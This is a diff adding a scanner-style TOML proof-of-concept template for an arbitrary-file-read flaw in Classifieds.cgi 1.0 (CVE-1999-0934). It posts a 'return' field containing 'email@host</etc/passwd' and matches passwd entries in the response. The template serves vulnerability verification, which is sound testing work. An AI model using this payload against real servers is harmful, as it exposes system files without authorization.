@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "通过向 classifieds.cgi 的 return 字段提交包含 shell 元字符的邮箱地址（如 email@host</etc/passwd），利用 shell 输入重定向符读取服务器任意文件，验证服务器是否存在该漏洞"
+id = "POC-AVE-1999-0734"
+name = "Greg Matthews Classifieds.cgi 1.0 任意文件读取 PoC"
+severity = "medium"
+tags = ["ave-1999-0734"]
+vuln_id = [
+    "CVE-1999-0934",
+    "AVE-1999-0734",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/classifieds.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "return=email@host</etc/passwd&subject=test&description=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin:",
+    "daemon:",
+]
